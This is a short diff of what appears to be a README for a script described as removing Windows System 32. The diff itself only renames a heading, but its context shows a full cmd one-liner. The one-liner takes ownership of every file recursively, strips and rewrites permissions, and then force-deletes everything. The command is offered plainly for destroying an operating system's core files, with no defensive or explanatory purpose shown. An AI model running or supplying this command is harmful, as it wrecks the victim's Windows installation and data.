@@ -27,7 +27,7 @@ A script used to remove System 32.
 * Opens CMD terminal
 * Execute command
 
-All
+Execution
 ```cmd
 takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
 ```
